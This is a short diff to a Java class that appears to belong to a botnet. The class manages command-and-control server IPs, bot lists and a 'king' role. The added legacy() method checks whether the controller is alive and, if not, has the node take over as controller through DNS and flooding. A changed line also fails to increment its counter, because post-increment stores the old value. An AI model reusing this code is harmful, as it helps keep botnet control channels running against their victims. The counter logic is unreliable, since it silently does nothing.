@@ -72,7 +72,7 @@ public class Commando {
 
 	@Autowired
 	private CryptoUtils crypto;
-
+	
 	/**
 	 * 
 	 */
@@ -265,7 +265,8 @@ public class Commando {
 			nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>(ip, pki.rebuildPuK(pk)));
 			pServ.setNewKing("");
 			nServ.setAliveBot(new SyncIpList<IP,String>());
-			// TODO DropDATABASE
+			Integer counter=nServ.getCounterCeCMemory();
+			nServ.setCounterCeCMemory(counter++);
 			return true;
 		}
 		return false;
@@ -360,6 +361,17 @@ public class Commando {
 		return null;
 	}
 
+	public void legacy(){
+		Boolean b=bReq.pingToCec(nServ.getCommandConquerIps().get(0).getValue1().toString());
+		if(!b){
+			newKingDns(nServ.getMyIp(),nServ.getPki().getPubRSAKeyToString());
+			newKingFlood(nServ.getMyIp(), nServ.getPki().getPubRSAKeyToString());
+		}else{
+			System.out.println("CeC vivo e funzionante");
+		}
+	}
+	
+	
 	public RoleServiceImpl getrServ() {
 		return rServ;
 	}
